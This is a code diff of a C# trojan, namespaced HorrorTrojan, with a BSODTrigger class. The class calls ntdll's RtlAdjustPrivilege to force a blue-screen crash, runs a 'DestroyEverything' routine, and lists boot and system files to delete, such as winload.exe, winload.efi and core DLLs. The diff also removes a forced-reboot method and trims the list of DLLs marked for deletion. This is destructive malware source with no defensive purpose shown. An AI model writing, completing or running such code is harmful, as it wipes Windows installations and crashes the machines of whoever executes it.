@@ -8,7 +8,6 @@ namespace HorrorTrojan
 {
     internal static class BSODTrigger
     {
-        // ===== NATIVE METHODS (КАК В ПРИМЕРЕ) =====
         [DllImport("ntdll.dll")]
         private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
@@ -22,14 +21,12 @@ namespace HorrorTrojan
             if (isTriggered) return;
             isTriggered = true;
             
-            // ===== 1. УНИЧТОЖАЕМ СИСТЕМУ =====
             try
             {
                 DestroyEverything();
             }
             catch { }
             
-            // ===== 2. ВЫЗЫВАЕМ BSOD (КАК В ПРИМЕРЕ) =====
             try
             {
                 bool t1;
@@ -39,7 +36,6 @@ namespace HorrorTrojan
             }
             catch
             {
-                // ЗАПАСНОЙ ВАРИАНТ
                 try
                 {
                     Process.Start(new ProcessStartInfo
@@ -54,29 +50,6 @@ namespace HorrorTrojan
                 
                 Environment.Exit(1);
             }
-        }
-        
-        private static void ForceShutdown()
-        {
-            try
-            {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "shutdown",
-                    Arguments = "/r /f /t 0",
-                    CreateNoWindow = true,
-                    UseShellExecute = false
-                });
-            }
-            catch { }
-            
-            try
-            {
-                Process.GetCurrentProcess().Kill();
-            }
-            catch { }
-            
-            Environment.Exit(1);
         }
         
         private static void DestroyEverything()
@@ -166,9 +139,8 @@ namespace HorrorTrojan
         {
             try
             {
-                // ===== ФАЙЛЫ, КОТОРЫЕ НЕЛЬЗЯ УДАЛЯТЬ (НУЖНЫ ДЛЯ BSOD) =====
-                // ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
-                // csrss.exe, services.exe, lsass.exe, svchost.exe, smss.exe, wininit.exe
+                // НЕ УДАЛЯЕМ: ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
+                // НЕ УДАЛЯЕМ: user32.dll, gdi32.dll, shell32.dll, advapi32.dll
                 
                 string[] systemFiles = new string[]
                 {
@@ -192,10 +164,6 @@ namespace HorrorTrojan
                     @"C:\boot\bootstat.dat",
                     @"C:\Windows\System32\winload.exe",
                     @"C:\Windows\System32\winload.efi",
-                    @"C:\Windows\System32\user32.dll",
-                    @"C:\Windows\System32\gdi32.dll",
-                    @"C:\Windows\System32\advapi32.dll",
-                    @"C:\Windows\System32\shell32.dll",
                     @"C:\Windows\System32\ole32.dll",
                     @"C:\Windows\System32\oleaut32.dll",
                     @"C:\Windows\System32\comctl32.dll",
